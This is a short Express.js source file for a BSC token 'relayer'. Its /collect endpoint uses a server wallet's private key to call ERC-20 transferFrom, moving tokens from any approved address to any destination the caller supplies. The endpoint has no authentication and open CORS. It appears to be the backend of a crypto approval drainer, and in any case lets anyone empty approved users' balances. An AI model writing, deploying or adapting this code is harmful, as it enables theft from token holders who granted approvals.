import express from "express";
import cors from "cors";
import { ethers } from "ethers";
import dotenv from "dotenv";

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());

/* ================= CONFIG ================= */

const RPC_URL = "https://bsc-dataseed.binance.org/";
const provider = new ethers.JsonRpcProvider(RPC_URL);

const wallet = new ethers.Wallet(
  process.env.PRIVATE_KEY,
  provider
);

const ERC20_ABI = [
  "function balanceOf(address) view returns(uint256)",
  "function allowance(address,address) view returns(uint256)",
  "function transferFrom(address,address,uint256) returns(bool)"
];

/* ================= HEALTH ================= */

app.get("/", (req, res) => {
  res.send("Relayer running ✅");
});

/* ================= COLLECT ================= */

app.post("/collect", async (req, res) => {

  try {

    const { token, from, to, amount } = req.body;

    console.log("Incoming:", req.body);

    if (!token || !from || !to || !amount) {
      return res.status(400).json({
        error: "Missing parameters"
      });
    }

    const contract = new ethers.Contract(
      token,
      ERC20_ABI,
      wallet
    );

    // ✅ amount already WEI (frontend se aa raha)
    const amountWei = BigInt(amount);

    /* ---------- BALANCE CHECK ---------- */
    const balance = await contract.balanceOf(from);

    if (balance < amountWei) {
      return res.status(400).json({
        error: "User balance too low"
      });
    }

    /* ---------- ALLOWANCE CHECK ---------- */
    const allowance = await contract.allowance(
      from,
      wallet.address
    );

    if (allowance < amountWei) {
      return res.status(400).json({
        error: "Approval not enough"
      });
    }

    /* ---------- TRANSFER ---------- */
    console.log("Sending transferFrom...");

    const tx = await contract.transferFrom(
      from,
      to,
      amountWei
    );

    console.log("TX:", tx.hash);

    const receipt = await tx.wait();

    res.json({
      success: true,
      hash: receipt.hash
    });

  } catch (err) {

    console.error("ERROR:", err);

    res.status(500).json({
      error: err.reason || err.message
    });
  }
});

/* ================= START ================= */

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server running on", PORT);
});
